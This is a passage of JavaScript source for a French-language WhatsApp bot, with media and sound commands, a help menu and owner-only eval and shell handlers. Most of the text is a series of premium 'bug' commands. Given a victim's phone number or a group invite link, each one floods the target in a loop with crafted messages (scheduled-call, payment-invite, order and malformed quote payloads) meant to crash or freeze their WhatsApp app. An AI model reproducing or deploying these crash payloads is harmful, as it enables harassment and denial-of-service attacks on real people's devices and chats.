*${themeemoji}Titre:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Durée:* ${vid.duration}
*${themeemoji}Qualité:* ${vid.quality}`
await KervensKingBot.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'sound1':
case 'sound2':
// ... (tous les autres sons jusqu'à sound161)
case 'sound161':
KervensKingBot_dev = await getBuffer(`https://github.com/KervensKing/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await KervensKingBot.sendMessage(m.chat, { audio: KervensKingBot_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

//cas de bugs
case 'clearchat':
kervenSend('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
case 'iosq':{
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 509xxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
KervensKingBot.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
"participant": victim,
"quotedMessage": {
"conversation": kerventext1
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})
}
replyGroup(`*Bug envoyé avec succès à ${victim} Veuillez patienter 3 minutes*`)
}
break
case 'iosgoogle': {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 509xxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
KervensKingBot.sendMessage(victim,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: kerventext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replyGroup(`*Bug envoyé avec succès à ${victim} Veuillez patienter 3 minutes*`)
}
break
case 'iosgoogle2': {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} quantité\nExemple ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
KervensKingBot.sendMessage(m.chat,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: kerventext6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: link,
}}
})
}
replyGroup(`*Bug envoyé avec succès en quantité ${amount} Veuillez patienter 3 minutes*`)
}
break
case 'xioscrash':
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 509xxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
KervensKingBot.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replyGroup(`*Bug envoyé avec succès à ${victim} Veuillez patienter 3 minutes*`)
break
case 'xioscrash2':{
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} quantité\nExemple ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
KervensKingBot.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replyGroup(`*Bug envoyé avec succès en quantité ${amount} Veuillez patienter 3 minutes*`)
}
break
case 'xcrash':{
if (!isPremium) return replyGroup(mess.prem)
 if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 509xxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
KervenCrash(pushname,victim)
await sleep(3000)
}
replyGroup(`*Bug envoyé avec succès à ${victim} Veuillez patienter 3 minutes*`)
}
break
case 'xcrash2':
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} quantité\nExemple ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
KervenCrash(pushname,m.chat)
await sleep(3000)
}
replyGroup(`*Bug envoyé avec succès en quantité ${amount} Veuillez patienter 3 minutes*`)
break
case 'amountbug': {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} quantité\nExemple ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const kervenybug1 = `${kerventext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replyGroup(`*Bug envoyé avec succès en quantité ${amount} Veuillez patienter 3 minutes*`)
break
case 'pmbug' :{
 if (!isPremium) return replyGroup(mess.prem)
 if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 50942588377`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const kervenybug1 = `${kerventext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replyGroup(`*Bug envoyé avec succès à ${victim} Veuillez patienter 3 minutes*`)
break
case 'delaybug' : {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 50942588377`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const kervenybug1 = kerventext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replyGroup(`*Bug envoyé avec succès à ${victim} Veuillez patienter 3 minutes*`)
break
case 'docubug': {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 50942588377`)
await loading()
if (args.length < 1) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 50942588377`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const kervenybug1 = `${kerventext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replyGroup(`*Bug envoyé avec succès à ${victim} Veuillez patienter 3 minutes*`)
break
case 'unlimitedbug' : {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 50942588377`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const kervenybug1 = kerventext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replyGroup(`*Bug envoyé avec succès à ${victim} Veuillez patienter 3 minutes*`)
break
case 'bombug': {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 50942588377`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const kervenybug1 = kerventext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replyGroup(`*Bug envoyé avec succès à ${victim} Veuillez patienter 3 minutes*`)
break
case 'lagbug' : {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 50942588377`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const kervenybug1 = kerventext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replyGroup(`*Bug envoyé avec succès à ${victim} Veuillez patienter 3 minutes*`)
break
case 'trollybug': {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} numéro\nExemple ${prefix+command} 50942588377`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG TROLLY ", 
"sellerJid": "50942588377@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
KervensKingBot.relayMessage(victim, order.message, { messageId: order.key.id })
}
replyGroup(`*Bug envoyé avec succès à ${victim} Veuillez patienter 3 minutes*`)
}
break
case 'gcbug' : {
if (!isPremium) return replyGroup(mess.prem)
 if (!args[0]) return replyGroup(`Utilisez ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kervengc = await KervensKingBot.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const kervenybug1 = `${kerventext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(kervengc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replyGroup(`*Bug envoyé avec succès à ${kervengc} Veuillez patienter 3 minutes*`)
}
break
case 'delaygcbug' :  {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kervengc = await KervensKingBot.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const kervenybug1 = kerventext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(kervengc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replyGroup(`*Bug envoyé avec succès à ${kervengc} Veuillez patienter 3 minutes*`)
}
break
case 'laggcbug' :  {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/C6mhOzGQqK5Lpu3y7noTOd`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kervengc = await KervensKingBot.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const kervenybug1 = kerventext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(kervengc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replyGroup(`*Bug envoyé avec succès à ${kervengc} Veuillez patienter 3 minutes*`)
}
break
case 'bomgcbug' :  {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/C6mhOzGQqK5Lpu3y7noTOd`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kervengc = await KervensKingBot.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const kervenybug1 = kerventext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(kervengc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replyGroup(`*Bug envoyé avec succès à ${kervengc} Veuillez patienter 3 minutes*`)
}
break
case 'unlimitedgcbug' :  {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/C6mhOzGQqK5Lpu3y7noTOd`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kervengc = await KervensKingBot.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const kervenybug1 = kerventext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(kervengc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replyGroup(`*Bug envoyé avec succès à ${kervengc} Veuillez patienter 3 minutes*`)
}
break
case 'trollygcbug' :  {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/C6mhOzGQqK5Lpu3y7noTOd`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kervengc = await KervensKingBot.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG TROLLY ", 
"sellerJid": "50942588377@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
KervensKingBot.relayMessage(kervengc, order.message, { messageId: order.key.id })
}
replyGroup(`*Bug envoyé avec succès à ${kervengc} Veuillez patienter 3 minutes*`)
}
break
case 'docugcbug' :  {
if (!isPremium) return replyGroup(mess.prem)
if (!args[0]) return replyGroup(`Utilisez ${prefix+command} lien\nExemple ${prefix+command} https://chat.whatsapp.com/C6mhOzGQqK5Lpu3y7noTOd`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let kervengc = await KervensKingBot.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const kervenybug1 = `${kerventext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("America/Port-au-Prince").format("DD/MM/YYYY HH:mm:ss")}`,
"title": kervenybug1,
}
}), { userJid: from, quoted : m})
KervensKingBot.relayMessage(kervengc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replyGroup(`*Bug envoyé avec succès à ${kervengc} Veuillez patienter 3 minutes*`)
} 
break
            case 'menu':
            case 'help':
            case 'alive':
            case '?':
                let kervenmenuoh = `Bonjour ${pushname}
╰┈➤ ${kerventimewisher} 😄
${readmore}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

* ╰┈➤ MENU BUG NUMÉRO*
❏ xcrash 509xxxxxxx
❏ xioscrash 509xxxxxxx
❏ iosgoogle 509xxxxxxx
❏ iosq 509xxxxxxx
❏ crotbug 509xxxxxxx

*⊱ BUG SUR PLACE*
❏ xcrash2 ,5
❏ xioscrash2 ,10
❏ iosgoogle2 ,20
▬▭▬▭▬▭▬▭▬▬▭▬▭▬ 

" ╰┈➤ MENU PROPRIÉTAIRE*
❏ getsession
❏ deletesession
❏ join
❏ shutdown  
❏ restart
❏ autoread *[option]*
❏ autotyping *[option]*
❏ autorecording *[option]*
❏ autorecordtyp *[option]*
❏ autobio *[option]*
❏ autoswview *[option]*
❏ mode *[option]*
❏ block
❏ unblock 
❏ backup
❏ getcase
❏ addowner
❏ delowner
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

╰┈➤ MENU GROUPE
❏ closetime
❏ opentime
❏ kick
❏ add
❏ promote
❏ demote
❏ setdesc
❏ setppgc
❏ tagall
❏ hidetag
❏ totag
❏ group *[option]*
❏ editinfo
❏ linkgc
❏ revoke
❏ listonline
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

╰┈➤ MENU PRINCIPAL
❏ menu
❏ buypremium
❏ runtime
❏ script
❏ donate
❏ owner
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

╰┈➤ MENU CONVERSION
❏ sticker
❏ smeme
❏ take
❏ toimage
❏ tovideo
❏ toaudio
❏ tomp3
❏ tovn
❏ togif
❏ tourl
❏ toqr
❏ toviewonce
❏ fliptext
❏ emojimix
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

╰┈➤ MENU BASE DE DONNÉES
❏ addvideo
❏ addimage
❏ addsticker
❏ addvn
❏ addzip
❏ addapk
❏ addpdf
❏ delvideo
❏ delimage
❏ delsticker
❏ delvn
❏ delzip
❏ delapk
❏ delpdf
❏ listvideo
❏ listimage
❏ liststicker
❏ listvn
❏ listzip
❏ listapk
❏ listpdf
▬▭▬▭▬▭▬▭▬▬▭▬▭▬

╰┈➤ MENU TÉLÉCHARGEMENT
❏ play
❏ ytmp3
❏ ytmp4
❏ sound1 - sound161

▬▭▬▭▬▭▬▭▬▬▭▬▭▬`
if (typemenu === 'v1') {
                    KervensKingBot.sendMessage(m.chat, {
                        text: kervenmenuoh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/kSs1stX/thumb.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    KervensKingBot.sendMessage(m.chat, {
      video: fs.readFileSync('./modsMedia/thumb2.mp4'),
      gifPlayback: true,
      caption: kervenmenuoh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    KervensKingBot.sendMessage(m.chat, {
                        video: fs.readFileSync('./modsMedia/thumb2.mp4'),
                        caption: kervenmenuoh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    KervensKingBot.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: kervenmenuoh
                        }
                    }, {})
                }
                break
                break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replyGroup(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replyGroup(bang)
                    }
                    try {
                        replyGroup(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replyGroup(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replyGroup(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replyGroup(evaled)
                    } catch (err) {
                        await replyGroup(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replyGroup(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replyGroup(err)
                        if (stdout) return replyGroup(stdout)
                    })
                }
        }
    } catch (err) {
        KervensKingBot.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Mise à jour de ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Exception attrapée: ', err)
})
